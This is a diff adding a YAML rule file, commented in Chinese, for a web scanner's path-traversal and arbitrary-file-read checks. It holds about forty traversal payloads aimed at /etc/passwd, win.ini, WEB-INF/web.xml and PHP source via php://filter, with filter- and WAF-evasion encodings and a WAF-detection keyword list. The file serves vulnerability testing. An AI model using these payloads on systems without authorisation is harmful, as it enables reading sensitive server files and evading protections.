@@ -1,0 +1,170 @@
+# 目录遍历 / 任意文件读取（Path Traversal / Arbitrary File Read）规则库。
+#
+# 这个文件只放“检测用什么 payload、命中怎么判定”，不放调度逻辑。
+# rules.py 是很薄的加载器，把 {value} 占位符替换成实际参数值。
+#
+# 设计目标：覆盖面广、通用性强、检出率高，同时把误报压到最低。
+#
+# 【核心判定思路（低误报的关键）】
+#   和命令注入的“算术回显”同理：不看“参数是否被反射”，而看“响应里是否出现了
+#   目标文件的内容特征”。
+#   - 注入 ../../../etc/passwd，只有真的读到文件，响应里才会出现 root:x:0:0: 这种
+#     /etc/passwd 独有的行特征（signature）。
+#   - 如果只是参数被原样反射，响应里出现的是 payload 本身（../../etc/passwd），
+#     而 signature（root:x:0:0:）不会出现。
+#   因此“signature 出现在响应、且不在 baseline”天然区分“真读到文件”和“普通反射”，
+#   误报极低。
+#
+# 【绕过写法：直接并进基础 payload】
+#   目录遍历需要发送的请求本来就不多，所以把常见绕过编码（%2f 单编码、%252f 双编码、
+#   ....// 嵌套、反斜杠、前置斜杠、%00 截断、file:// 包装、UTF-8 overlong（%c0%af/%c1%9c）、
+#   IIS %u002f、Tomcat ..;/ 等）直接写进基础 payload 列表，一轮就把主流绕过都覆盖到，
+#   通用性最强。
+#   另外保留一个很薄的 tamper 阶段（见文件末尾），只在响应像被 WAF 拦截、或开启
+#   deep_tamper 且未命中时，对未编码 payload 再补少量编码变形，作为兜底。
+#
+# 【三种检测方式（报告里统一归为一种漏洞“任意文件读取”，用证据的“检测方式”区分）】
+#   1. 文件内容回显（technique=content）：注入遍历 payload 读系统敏感文件，
+#      响应命中该文件的 signature 即确认。unix 读 /etc/passwd，windows 读 win.ini。
+#   2. PHP 源码读取（technique=php_source）：php://filter 把脚本源码 base64 编码后回显，
+#      解码后出现 <?php / <?= 即确认（读到了服务端源码，属任意文件读取）。
+#   3. 其余包装器/绝对路径也归到 content，靠 signature 判定。
+#
+# os 字段：unix / windows / any。识别出目标 OS 后按 os 裁剪 payload，减少无效请求。
+
+# ---------------------------------------------------------------------------
+# 目标文件 signature（命中判定）。
+#   signature 是“只有真的读到该文件才会出现”的正则，绝不出现在 payload 里，
+#   因此参数被反射不会误报。区分大小写由正则自身控制（win.ini 用 (?i)）。
+#   __php_base64__ 是特殊哨兵：不做正则匹配，改为在响应里找 base64 块解码后判 PHP 源码。
+# ---------------------------------------------------------------------------
+targets:
+  # /etc/passwd 首行形如 root:x:0:0:root:/root:/bin/bash，:0:0: 是 root 账号的独有特征。
+  passwd:
+    os: unix
+    signature: 'root:.*?:0:0:'
+  # win.ini 是 Windows 上人人都有的 ini，含 [fonts]/[extensions]/[mci extensions] 段。
+  win_ini:
+    os: windows
+    signature: '(?i)\[(fonts|extensions|mci extensions)\]'
+  # PHP 源码：base64 解码后出现 PHP 开标签，说明读到了脚本源码。
+  php_b64:
+    os: unix
+    signature: '__php_base64__'
+  # /proc/version 内容形如 "Linux version 5.x ..."，是 passwd 被限制时的 unix 兜底目标。
+  proc_version:
+    os: unix
+    signature: 'Linux version [0-9]'
+  # Windows boot.ini 含 [boot loader] 段，是 win.ini 之外的 windows 兜底目标（老系统）。
+  boot_ini:
+    os: windows
+    signature: '(?i)\[boot loader\]'
+  # Java Web 应用部署描述符 WEB-INF/web.xml，含 <web-app> 根标签，命中即读到应用源码目录。
+  web_xml:
+    os: any
+    signature: '(?i)</?web-app'
+
+# ---------------------------------------------------------------------------
+# 探测 payload。
+#   每条已经把“绕过编码”并进来了，{value} 会被替换成参数原值（前缀绕过型会用到）。
+#   target 指向上面的 signature；technique 缺省为 content。
+#   depth 统一用 8 层 ../：即使实际目录没那么深也无妨，根目录处多余的 ../ 会被系统忽略。
+# ---------------------------------------------------------------------------
+payloads:
+  # ========================= Unix: /etc/passwd =========================
+  # --- 纯遍历 / 深度遍历 ---
+  - { name: unix_plain_deep,      os: unix, target: passwd, template: '../../../../../../../../etc/passwd' }
+  # 前缀绕过：服务端把参数拼到固定目录后面时，用原值打头再往上跳。
+  - { name: unix_prefix_deep,     os: unix, target: passwd, template: '{value}/../../../../../../../../etc/passwd' }
+  # --- 绝对路径 / 前置斜杠 ---
+  - { name: unix_absolute,        os: unix, target: passwd, template: '/etc/passwd' }
+  - { name: unix_leadslash_trav,  os: unix, target: passwd, template: '/../../../../../../../etc/passwd' }
+  # --- ....// 嵌套：绕过“把 ../ 替换成空”的一次性过滤 ---
+  - { name: unix_nested_dotslash, os: unix, target: passwd, template: '....//....//....//....//....//....//etc/passwd' }
+  # --- URL 单编码（%2f=/），绕过对字面 / 或 ../ 的过滤 ---
+  - { name: unix_url_slash,       os: unix, target: passwd, template: '..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd' }
+  # --- URL 编码点（%2e=.），绕过对字面 .. 的过滤 ---
+  - { name: unix_url_dot,         os: unix, target: passwd, template: '%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd' }
+  # --- 双重 URL 编码（%252f 解码一次得 %2f，再解一次得 /），绕过“解码一次后再过滤”---
+  - { name: unix_double_url,      os: unix, target: passwd, template: '..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd' }
+  # --- %00 空字节截断（老版本 PHP：忽略 payload 后面强行拼接的扩展名）---
+  - { name: unix_nullbyte,        os: unix, target: passwd, template: '../../../../../../../../etc/passwd%00' }
+  - { name: unix_null_suffix,     os: unix, target: passwd, template: '../../../../../../../../etc/passwd%00.png' }
+  # --- file:// 包装器 ---
+  - { name: unix_file_wrapper,    os: unix, target: passwd, template: 'file:///etc/passwd' }
+  # --- 反斜杠混淆（部分中间件会把 \ 归一成 /）---
+  - { name: unix_backslash_enc,   os: unix, target: passwd, template: '..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc%5cpasswd' }
+  # --- UTF-8 overlong 编码（%c0%af 是 / 的非法长编码，绕过按字面 / 过滤，经典 IIS/Tomcat）---
+  - { name: unix_overlong_slash,  os: unix, target: passwd, template: '..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd' }
+  # --- IIS 16 位 unicode（%u002f=/），针对做 %uXXXX 自定义解码的中间件 ---
+  - { name: unix_iis_unicode,     os: unix, target: passwd, template: '..%u002f..%u002f..%u002f..%u002f..%u002f..%u002fetc%u002fpasswd' }
+  # --- Tomcat/Java 分号路径参数绕过（..;/ 让代理/安全约束失效后仍按 .. 处理）---
+  - { name: unix_tomcat_semi,     os: unix, target: passwd, template: '..;/..;/..;/..;/..;/..;/..;/etc/passwd' }
+  # --- /proc/version：passwd 被限制读取时的兜底目标（signature 唯一，误报低）---
+  - { name: unix_proc_version,    os: unix, target: proc_version, template: '../../../../../../../../proc/version' }
+  - { name: unix_proc_version_abs,os: unix, target: proc_version, template: '/proc/version' }
+
+  # ========================= Java: WEB-INF/web.xml（webroot 相对，需多深度尝试）=========================
+  # 这类文件相对 webroot，无法靠“根目录吸收多余 ../”定位，深度必须刚好，故按几档深度各发一次。
+  - { name: java_webxml_d3,       os: any, target: web_xml, template: '../../../WEB-INF/web.xml' }
+  - { name: java_webxml_d5,       os: any, target: web_xml, template: '../../../../../WEB-INF/web.xml' }
+  - { name: java_webxml_d7,       os: any, target: web_xml, template: '../../../../../../../WEB-INF/web.xml' }
+  - { name: java_webxml_prefix,   os: any, target: web_xml, template: '{value}/../../../../../../WEB-INF/web.xml' }
+
+  # ========================= Windows: win.ini =========================
+  - { name: win_plain_deep,       os: windows, target: win_ini, template: '..\..\..\..\..\..\..\..\windows\win.ini' }
+  - { name: win_slash_deep,       os: windows, target: win_ini, template: '../../../../../../../../windows/win.ini' }
+  - { name: win_prefix_deep,      os: windows, target: win_ini, template: '{value}\..\..\..\..\..\..\..\..\windows\win.ini' }
+  - { name: win_absolute,         os: windows, target: win_ini, template: 'C:\windows\win.ini' }
+  - { name: win_absolute_slash,   os: windows, target: win_ini, template: 'C:/windows/win.ini' }
+  - { name: win_url_backslash,    os: windows, target: win_ini, template: '..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini' }
+  - { name: win_nested_dotslash,  os: windows, target: win_ini, template: '....\\....\\....\\....\\....\\windows\win.ini' }
+  - { name: win_double_url,       os: windows, target: win_ini, template: '..%255c..%255c..%255c..%255c..%255cwindows%255cwin.ini' }
+  - { name: win_file_wrapper,     os: windows, target: win_ini, template: 'file:///C:/windows/win.ini' }
+  # --- UTF-8 overlong 反斜杠（%c1%9c 是 \ 的非法长编码，经典 IIS 绕过）---
+  - { name: win_overlong_bslash,  os: windows, target: win_ini, template: '..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9cwindows%c1%9cwin.ini' }
+  # --- boot.ini：win.ini 之外的兜底目标（含 [boot loader]，老版本 Windows）---
+  - { name: win_boot_ini,         os: windows, target: boot_ini, template: '..\..\..\..\..\..\..\..\boot.ini' }
+  - { name: win_boot_ini_abs,     os: windows, target: boot_ini, template: 'C:\boot.ini' }
+
+  # ========================= PHP 源码读取（任意文件读取的一种）=========================
+  # 只有 PHP 站点有效；把当前脚本/常见入口 base64 出来，解码见 <?php 即确认。
+  - { name: php_filter_value,     os: unix, target: php_b64, technique: php_source, template: 'php://filter/convert.base64-encode/resource={value}' }
+  - { name: php_filter_index,     os: unix, target: php_b64, technique: php_source, template: 'php://filter/convert.base64-encode/resource=index.php' }
+  - { name: php_filter_read,      os: unix, target: php_b64, technique: php_source, template: 'php://filter/read=convert.base64-encode/resource={value}' }
+  # php://filter 也能读任意文件（非脚本）：把 /etc/passwd base64 出来，解码后按 passwd 特征判定。
+  - { name: php_filter_passwd,    os: unix, target: php_b64, technique: php_source, template: 'php://filter/convert.base64-encode/resource=../../../../../../etc/passwd' }
+
+# ---------------------------------------------------------------------------
+# WAF / 拦截页识别。命中后对未编码 payload 尝试 tamper 变形绕过。结构和其它插件一致。
+# ---------------------------------------------------------------------------
+waf_detection:
+  status_codes: [403, 406, 429, 501, 999]
+  header_keywords:
+    - x-waf
+    - waf
+    - cloudflare
+    - x-sucuri-id
+    - incapsula
+    - x-denied-reason
+  body_keywords:
+    - waf
+    - forbidden
+    - access denied
+    - blocked
+    - security policy
+    - not acceptable
+    - 拦截
+    - 非法请求
+    - 已被防火墙
+    - 安全防护
+
+# 单个 payload 被 WAF 拦截时，最多尝试多少个 tamper 变形。
+max_tampered_payloads_per_probe: 3
+
+# tamper 变形策略（很薄的兜底，主流绕过已并进基础 payload）。
+# tampers 是 tamper.py 里的函数名，按顺序叠加。
+tamper_profiles:
+  - { name: url_encode,        tampers: [url_encode] }
+  - { name: double_url_encode, tampers: [double_url_encode] }
+  - { name: dot_url_encode,    tampers: [dot_url_encode] }
